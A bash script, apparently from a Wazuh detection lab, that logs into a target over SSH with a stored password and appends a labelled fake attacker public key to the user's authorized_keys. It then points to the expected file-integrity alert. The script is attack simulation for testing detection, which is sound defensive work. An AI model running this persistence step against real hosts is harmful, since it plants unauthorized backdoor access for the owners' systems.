#!/bin/bash
set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/common.sh"

ROGUE_KEY_COMMENT="attacker-lab-key-$$"
ROGUE_PUBKEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILabAtackerFakeKeyDoNotUse0000000000000 ${ROGUE_KEY_COMMENT}"

log_event "add_ssh_key_start" "INFO" "Objetivo=${TARGET_HOST} usuario=${TARGET_USER}"

salida=$(sshpass -p "${TARGET_PASS}" ssh ${SSH_OPTS} "${TARGET_USER}@${TARGET_HOST}" \
    "mkdir -p ~/.ssh && echo '${ROGUE_PUBKEY}' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && echo INSERCION_OK" 2>&1)

if echo "${salida}" | grep -q "INSERCION_OK"; then
    log_event "add_ssh_key_end" "OK" "Clave no autorizada insertada en authorized_keys de ${TARGET_USER}"
    echo "Clave SSH no autorizada insertada. Revisa la alerta FIM de Wazuh (regla 100030) y la evidencia preservada."
else
    log_event "add_ssh_key_end" "FALLO" "Salida inesperada: ${salida}"
    exit 1
fi